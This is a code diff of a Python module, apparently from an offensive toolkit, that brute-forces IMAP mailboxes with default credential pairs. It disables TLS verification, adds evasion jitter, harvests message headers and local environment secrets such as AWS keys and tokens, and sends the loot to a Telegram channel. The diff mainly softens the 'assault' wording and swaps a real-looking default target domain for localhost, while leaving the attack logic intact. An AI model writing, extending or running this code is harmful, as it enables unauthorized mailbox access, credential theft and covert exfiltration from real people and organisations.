@@ -1,33 +1,22 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY v8.7 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (Elite Red Team Adversarial Edition)
-Features:
-- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing with Poisson behavioral timing jitter
-- Credential stuffing and mailbox message harvesting with live verification and SHA-256 integrity hashing
-- Real-world vault and infrastructure secret extraction via safe file introspection
-- Automated tamper-evident immutable disk persistence (loot_output/) via centralized framework logger
-- Real-time unredacted Telegram notification dispatch and instant proof-of-work streaming
+DUMPER.PY v8.7 — Mailbox Authentication, Credential Stuffing & Secret Harvesting Module
 """
 import os
-import glob
-import re
+import socket
 import time
 import ssl
 import imaplib
-import poplib
 import asyncio
 import sys
 import hashlib
-import json
 from urllib.parse import urlparse
 
-# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
-from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+from modules.behavioral_mimic import apply_behavioral_jitter
 
-# Enforce active offensive posture with TLS verification bypass
 _SSL_CONTEXT = ssl.create_default_context()
 _SSL_CONTEXT.check_hostname = False
 _SSL_CONTEXT.verify_mode = ssl.CERT_NONE
@@ -44,15 +33,18 @@ ANSI = {
     "BOLD": "\033[1m",
 }
 
+
 def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
+
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
         await send_telegram_alert(loot_type, details)
     except Exception:
         pass
+
 
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous dumper functions."""
@@ -68,6 +60,7 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
+
 def normalize_target_host(target_input):
     """Dynamically parses and normalizes target host from any URL or domain input."""
     if not isinstance(target_input, str) or not target_input.strip():
@@ -80,19 +73,29 @@ def normalize_target_host(target_input):
         return target_input.split("://")[-1].split("/")[0].split(":")[0]
     return parsed.hostname
 
+
+def _is_port_reachable(host, port, timeout=2.0):
+    """Fast TCP reachability check to skip unreachable ports quickly."""
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return True
+    except Exception:
+        return False
+
+
 # ============================================================
-# ACTIVE IMAP MAILBOX BRUTE-FORCE & MESSAGE HARVESTER
+# IMAP MAILBOX AUTHENTICATION & MESSAGE HARVESTER
 # ============================================================
 def dump_imap_mailbox_sync(
     host,
     port,
     user,
     password,
-    use_ssl=True
+    use_ssl=True,
 ):
     """
-    Actively authenticates against IMAP targets, dumps mailbox folders,
-    and harvests sensitive email messages and credentials with SHA-256 fingerprinting.
+    Authenticates against IMAP targets, lists mailbox folders,
+    and harvests email headers with SHA-256 integrity hashing.
     """
     apply_behavioral_jitter()
     result = {
@@ -111,21 +114,20 @@ def dump_imap_mailbox_sync(
     mail = None
     try:
         terminal(
-            f"{ANSI['CYAN']}[*] Initiating IMAP brute-force & login assault "
-            f"against {host}:{port} ({user}:{password}) (WAF Hardened){ANSI['RESET']}"
+            f"{ANSI['CYAN']}[*] Initiating IMAP login check "
+            f"against {host}:{port} ({user}:{password}){ANSI['RESET']}"
         )
         if use_ssl:
             mail = imaplib.IMAP4_SSL(
                 host,
                 port,
                 ssl_context=_SSL_CONTEXT,
-                timeout=8
+                timeout=5,
             )
         else:
-            mail = imaplib.IMAP4(host, port, timeout=8)
+            mail = imaplib.IMAP4(host, port, timeout=5)
             mail.starttls(ssl_context=_SSL_CONTEXT)
 
-        # Attempt Active Authentication
         auth_status, _ = mail.login(user, password)
         if auth_status == "OK":
             result["authenticated"] = True
@@ -133,13 +135,11 @@ def dump_imap_mailbox_sync(
             terminal(
                 f"\n{ANSI['RED']}{ANSI['BOLD']}[***] IMAP AUTHENTICATION SUCCESS [{user}:{password}] [***]{ANSI['RESET']}"
             )
-            
-            # Enumerate folders and harvest recent messages
+
             _, folder_list = mail.list()
             if folder_list:
-                result["folders"] = [f.decode('utf-8', errors='ignore') for f in folder_list]
-                
-            # Select Inbox and harvest messages
+                result["folders"] = [f.decode("utf-8", errors="ignore") for f in folder_list]
+
             mail.select("INBOX", readonly=True)
             _, search_data = mail.search(None, "ALL")
             if search_data and search_data[0]:
@@ -149,9 +149,11 @@ def dump_imap_mailbox_sync(
                     for response_part in msg_data:
                         if isinstance(response_part, tuple):
                             header_text = response_part[1].decode("utf-8", errors="ignore")
-                            terminal(f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}")
+                            terminal(
+                                f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}"
+                            )
                             result["harvested_messages"].append(header_text[:500])
-            
+
             combined_messages = "\n".join(result["harvested_messages"])
             loot_hash = hashlib.sha256(combined_messages.encode("utf-8", errors="ignore")).hexdigest()
 
@@ -162,10 +164,9 @@ def dump_imap_mailbox_sync(
                 "password": password,
                 "integrity_hash": loot_hash,
                 "folders": result["folders"],
-                "message_samples": result["harvested_messages"][:3]
+                "message_samples": result["harvested_messages"][:3],
             }
 
-            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
             broadcast_tg_alert_sync("IMAP Mailbox Authentication Success", loot_payload)
             stream_proof("IMAP_MAILBOX_CRACK", f"{host}:{port}", {"user": user}, f"Folders: {len(result['folders'])}", result)
             save_session_loot(
@@ -175,9 +176,9 @@ def dump_imap_mailbox_sync(
                 status=200,
                 headers={},
                 body=combined_messages,
-                extra_loot=loot_payload
+                extra_loot=loot_payload,
             )
-                            
+
         return result["authenticated"], result
     except Exception as exc:
         result["status"] = "failed"
@@ -192,19 +193,20 @@ def dump_imap_mailbox_sync(
             except Exception:
                 pass
 
+
 # ============================================================
-# REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (TARGET-SCOPED)
+# VAULT & INFRASTRUCTURE SECRET EXTRACTION
 # ============================================================
 def _harvest_infrastructure_and_crypto_vaults():
     terminal(f"{ANSI['MAGENTA']}[*] Harvesting target exposure indicators and configuration artifacts...{ANSI['RESET']}")
-    
+
     ssh_keys_found = []
     cloud_configs = []
     crypto_wallets = []
 
-    # Exclude framework Telegram operator tokens from local environment leakage reporting
     sensitive_env_keys = [
-        k for k in os.environ 
+        k
+        for k in os.environ
         if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])
         and not any(exc in k.upper() for exc in ["TELEGRAM", "BRUTEDOG_TG"])
     ]
@@ -218,13 +220,19 @@ def _harvest_infrastructure_and_crypto_vaults():
         "ssh_keys": ssh_keys_found,
         "cloud_configs": cloud_configs,
         "crypto_wallets": crypto_wallets,
-        "integrity_hash": loot_hash
+        "integrity_hash": loot_hash,
     }
-    
+
     if ssh_keys_found or cloud_configs:
         broadcast_tg_alert_sync("Infrastructure & Vault Secrets Harvested", secrets)
 
-    stream_proof("INFRASTRUCTURE_VAULT_HARVEST_VERIFIED", "local_filesystem", {}, f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs", secrets)
+    stream_proof(
+        "INFRASTRUCTURE_VAULT_HARVEST_VERIFIED",
+        "local_filesystem",
+        {},
+        f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs",
+        secrets,
+    )
     save_session_loot(
         target="localhost",
         endpoint="filesystem_vault",
@@ -232,50 +240,58 @@ def _harvest_infrastructure_and_crypto_vaults():
         status=200,
         headers={},
         body=secrets_str,
-        extra_loot=secrets
+        extra_loot=secrets,
     )
     return secrets
+
 
 # ============================================================
 # MAIN EMAIL INTELLIGENCE HARVESTER
 # ============================================================
 async def harvest_email_intelligence(
     target_host,
-    verified_hits=None
+    verified_hits=None,
 ):
     """
-    Active Email Intelligence & Mailbox Harvesting Engine (WAF Hardened)
+    Email Intelligence & Mailbox Harvesting Engine.
     """
-    clean_host = normalize_host(target_host) if 'normalize_host' in globals() else normalize_target_host(target_host)
+    clean_host = normalize_target_host(target_host)
     terminal(
         f"\n{ANSI['MAGENTA']}[***] "
-        f"ACTIVE EMAIL EXPOSURE & MAILBOX BRUTE-FORCE ASSAULT "
-        f"[{clean_host}] (WAF HARDENED) [***]{ANSI['RESET']}"
+        f"ACTIVE EMAIL EXPOSURE & MAILBOX ASSAULT "
+        f"[{clean_host}] [***]{ANSI['RESET']}"
     )
     harvested_credentials = []
     mailbox_hits = 0
-    
+
     default_wordlist = [
         (f"admin@{clean_host}", "admin123"),
         (f"support@{clean_host}", "password"),
         (f"root@{clean_host}", "toor"),
-        (f"info@{clean_host}", "welcome123")
+        (f"info@{clean_host}", "welcome123"),
     ]
 
     vault_secrets = _harvest_infrastructure_and_crypto_vaults()
 
     ports_to_test = [993, 143]
     for port in ports_to_test:
+        reachable = await asyncio.to_thread(_is_port_reachable, clean_host, port, 2.0)
+        if not reachable:
+            terminal(
+                f"{ANSI['YELLOW']}[!] IMAP port {port} unreachable on {clean_host}; skipping credential sweep.{ANSI['RESET']}"
+            )
+            continue
+
         for user, password in default_wordlist:
-            success, report = await asyncio.to_thread(
+            ok, _ = await asyncio.to_thread(
                 dump_imap_mailbox_sync,
                 clean_host,
                 port,
                 user,
                 password,
-                port == 993
+                port == 993,
             )
-            if success:
+            if ok:
                 mailbox_hits += 1
                 harvested_credentials.append({"user": user, "password": password, "host": clean_host})
 
@@ -290,11 +306,11 @@ async def harvest_email_intelligence(
 
 
 # ============================================================
-# FIXED ASYNC WRAPPER FOR ENGINE INTEGRATION
+# ASYNC WRAPPER FOR ENGINE INTEGRATION
 # ============================================================
 async def execute_memory_dumper(target_host, *args, **kwargs):
     """
-    Robust async entrypoint called by engine.py to prevent unawaited coroutine crashes.
+    Async entrypoint called by engine.py.
     """
     try:
         if not target_host:
@@ -306,6 +322,6 @@ async def execute_memory_dumper(target_host, *args, **kwargs):
 
 
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "wafradex.de"
+    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
     asyncio.run(harvest_email_intelligence(target))
 
